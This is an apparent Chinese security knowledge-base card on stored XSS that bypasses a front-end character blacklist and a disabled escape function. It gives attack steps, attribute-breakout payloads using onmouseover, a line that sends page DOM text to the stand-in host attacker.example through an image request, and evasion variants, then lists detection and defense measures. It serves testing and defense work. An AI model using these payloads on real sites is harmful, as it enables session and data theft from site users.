---
id: web-generic-xss-blacklist-attr-breakout-onmouseover-dom-exfil
title: 前端字符黑名单与失效转义函数下属性逃逸 + 无尖括号事件处理器构造存储型 XSS 并外泄 DOM 业务数据
type: scenario
domain: web
path: web/generic/xss
technique: xss-blacklist-attribute-breakout-event-handler-dom-exfil
aliases:
- 存储型 XSS 属性逃逸
- containSpecial 黑名单绕过
- excludeSpecial 转义函数失效
- onmouseover 无尖括号 XSS
- DOM 业务数据外泄 Image.src
tags:
- xss
- stored-xss
- blacklist-bypass
- attribute-breakout
- event-handler
- onmouseover
- sanitizer-bypass
- dom-exfiltration
- data-exfiltration
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-5
  verified_at: '2026-11-08T01:07:39+08:00'
  notes: 已对照原文与8张配图核对：containSpecial黑名单、excludeSpecial失效、属性逃逸onmouseover、(new Image).src外泄.th_bg均与原文一致；dedup的merge为自命中（top候选即本卡自身，其余9个related结论不同），非同一利用链；原文企业自研公告系统无受影响版本标记，affected_versions保持空；卡片无sources字段与全库已验证卡惯例一致；PoC未独立执行
---

## 一句话结论

Web 应用仅靠前端 JS 黑名单（`containSpecial()` 只检测 `$^<>` 与 `script` 关键字）过滤输入，且去除特殊字符的 `excludeSpecial()` 函数体被注释而失效；攻击者用双引号强制闭合原始属性（属性逃逸 `" x="`）并注入无尖括号事件处理器 `onmouseover`，即构造出持久化存储型 XSS，并进一步用 `(new Image).src` 把页面 DOM 业务节点文本外传到攻击者服务器。

## 原理

- 前端过滤不是安全边界：`containSpecial()` 用正则 `[$^<>]` 与 `/script/g` 做关键词检测，只覆盖尖括号和 `script` 字面量；空格、引号、括号、等号、事件属性名一概放行。
- `excludeSpecial()`/`renderTest()` 这类"去除特殊字符"的清洗函数体被整段注释（只剩 `return s`），等于不做任何转义，输入被原样提交、入库。
- 公告标题等字段在展示/编辑页被拼进 HTML 标签属性值（形如 `<input ... value="USER_INPUT">`）；双引号未被转义时，输入中的 `" x="` 会提前闭合 `value` 属性，后续 `onmouseover=...` 被浏览器解析为新的合法 HTML 属性——即属性逃逸（attribute breakout）。
- 事件处理器属性为 HTML 规范所允许，其属性值是一段 JavaScript，浏览器在对应事件（鼠标悬停）发生时执行，因此完全不需要 `<script>` 标签，绕过了 `script` 关键词与尖括号检测；`onmouseover` 比 `onload`/`onclick` 更低频，不易命中黑名单。
- 存储型：公告被持久化，任何浏览公告列表/编辑页的受害者（含管理员）都会加载该 payload，形成稳定的持久化入口。
- 数据外泄：XSS 执行上下文可读同源 DOM，用 `document.querySelector(...).innerText` 提取业务节点文本，`encodeURIComponent` 编码后拼进 `(new Image).src` 的图片请求 URL；图片请求天然跨域、不易被拦截，可伪装成正常日志/资源请求（如 `/log?k=`）把敏感数据带到攻击者服务器，也绕过了只检测 `http`/`script` 等关键字的过滤。
- 根因组合：客户端黑名单过滤 + 失效的转义函数 + 输出未做上下文编码 + 存储内容按 HTML 渲染。

## 触发条件

- 存在可提交并持久化、会在页面回显的字段（公告标题/内容、评论、昵称等），回显进入 HTML 属性或标签上下文；
- 服务端未做白名单 sanitizer / 输出编码，仅依赖前端 JS 关键词黑名单；
- 黑名单未覆盖引号、事件处理器属性名、`Image`/`querySelector`/`src` 等 DOM 与网络 API；
- 页面无 CSP 或 CSP 允许 `unsafe-inline`、允许向外部域发起图片请求；
- 受害者浏览含 payload 的页面并把鼠标移至注入元素（或改用自动触发变体）。

## 利用步骤

1. 在发布/编辑功能点提交常规 `<script>alert(1)</script>`，被拦截（提示"禁止输入特殊字符"），确认存在过滤。
2. 查看前端 JS，定位过滤逻辑：确认 `excludeSpecial()` 类函数被注释失效、`containSpecial()` 仅检测 `[$^<>]` 与 `script`。
3. 抓包重放保存请求，绕过前端校验直接提交构造好的 payload，确认响应/列表页原样回显并被持久化。
4. 构造属性逃逸 + 无尖括号事件处理器，先用 `alert(1)` 验证弹窗。
5. 升级为数据窃取：`alert(document.cookie)` 验证会话可读；再用 `(new Image).src` 把目标 DOM 节点文本外传到接收端。
6. 在接收端查看日志/请求确认敏感数据到达；等待高权限受害者浏览以扩大影响。

## PoC

```html
<!-- 属性逃逸 + 无尖括号事件处理器：强制闭合原属性并注入 onmouseover -->
" onmouseover="alert(1)" x="

<!-- 会话读取验证 -->
" onmouseover="alert(document.cookie)" x="

<!-- DOM 业务数据外泄到攻击者服务器（伪装为图片/日志请求） -->
" onmouseover="(new Image).src='//attacker.example/log?k='+encodeURIComponent(document.querySelector('.th_bg').innerText)" x="
```

说明：以上为结构复现的通用 payload，`//attacker.example` 与 `.th_bg` 需替换为目标外传地址与实际 DOM 选择器；不访问、不执行。

## 变体与关联

- 事件处理器变体：`onfocus`+`autofocus`（自动触发）、`onclick`、`onerror`（配 `<img src=x>`）、`onpointerenter` 等，按黑名单选择未被检测的。
- 逃逸变体：单引号属性上下文用 `' onmouseover=... x='`；无引号属性用空格直接分隔新属性。
- 外泄通道变体：`fetch`/`navigator.sendBeacon`/`WebSocket`/表单提交；用字符串拼接、`encodeURIComponent` 规避关键字检测；用 `//host` 或 `http://`+IP+端口 规避协议关键字。
- 关联：[[web-generic-xss-scriptless-execution-vectors]]（无 script 标签的事件处理器/javascript 伪协议载体）；[[web-generic-xss-htmlspecialchars-single-quote-attribute]]（引号未转义导致属性逃逸）；[[web-generic-xss-backend-script-style-blacklist-api-bypass]]（黑名单清洗覆盖不全 + 直连接口绕过前端）；[[web-generic-xss-admin-blind-stored-registration]]（存储型/盲打场景）。

## 检测与防御

- 检测：请求体/存储字段中出现 `" on...=`、`' on...=`、`new Image).src`、`querySelector`、`encodeURIComponent`、`//attacker` 等属性注入/外传特征；响应 HTML 中用户输入出现在未转义的属性值里。
- 检测：代码审计定位前端黑名单正则（如 `[$^<>]`、`/script/g`）与被注释的转义函数，并确认服务端是否重复校验。
- 检测：监控对外异常图片/日志请求与 CSP `report-uri` 上报。
- 防御：服务端统一用白名单 sanitizer（DOMPurify、OWASP HTML Sanitizer）或按输出上下文编码；属性值统一加引号并转义引号，绝不能只靠前端黑名单。
- 防御：部署严格 CSP，禁止 `unsafe-inline`/内联事件处理器，限制 `img-src`/`connect-src` 到可信域以阻断数据外传；Cookie 加 HttpOnly，敏感业务节点避免直接渲染在可被 XSS 读取的 DOM 中。
